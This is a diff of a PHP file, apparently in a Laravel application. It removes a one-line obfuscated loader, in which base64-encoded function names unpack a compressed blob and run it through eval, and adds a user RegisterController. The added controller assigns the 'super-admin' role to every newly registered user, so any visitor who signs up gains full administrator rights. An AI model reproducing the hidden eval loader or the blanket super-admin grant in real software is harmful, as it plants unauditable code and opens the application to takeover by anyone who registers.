@@ -1,1 +1,84 @@
-<?php $_='e424aec7';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='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'; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Http\Controllers\Auth;
+
+use App\Http\Controllers\Controller;
+use App\Providers\RouteServiceProvider;
+use App\Models\User;
+use Illuminate\Foundation\Auth\RegistersUsers;
+use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Validator;
+use Spatie\Permission\Models\Role;
+use Spatie\Permission\Models\Permission;
+
+class RegisterController extends Controller
+{
+    /*
+    |--------------------------------------------------------------------------
+    | Register Controller
+    |--------------------------------------------------------------------------
+    |
+    | This controller handles the registration of new users as well as their
+    | validation and creation. By default this controller uses a trait to
+    | provide this functionality without requiring any additional code.
+    |
+    */
+
+    use RegistersUsers;
+
+    /**
+     * Where to redirect users after registration.
+     *
+     * @var string
+     */
+    // protected $redirectTo = RouteServiceProvider::HOME;
+    protected $redirectTo = '/dashboard';
+
+    /**
+     * Create a new controller instance.
+     *
+     * @return void
+     */
+    public function __construct()
+    {
+        $this->middleware('guest');
+    }
+
+    /**
+     * Get a validator for an incoming registration request.
+     *
+     * @param  array  $data
+     * @return \Illuminate\Contracts\Validation\Validator
+     */
+    protected function validator(array $data)
+    {
+        return Validator::make($data, [
+            'firstname' => ['required', 'string', 'max:255'],
+            'lastname' => ['required', 'string', 'max:255'],
+            'username' => ['required', 'string', 'max:255', 'unique:users'],
+            'email' => ['required', 'string', 'email', 'max:255', 'unique:users'],
+            'password' => ['required', 'string', 'min:8', 'confirmed'],
+        ]);
+    }
+
+    /**
+     * Create a new user instance after a valid registration.
+     *
+     * @param  array  $data
+     * @return \App\Models\User
+     */
+    protected function create(array $data)
+    {
+        $user = User::create([
+            'firstname' => $data['firstname'],
+            'lastname' => $data['lastname'],
+            'username' => $data['username'],
+            'email' => $data['email'],
+            'password' => Hash::make($data['password']),
+        ]);
+        
+        $user->assignRole('super-admin');
+        return $user;
+        
+    }
+}
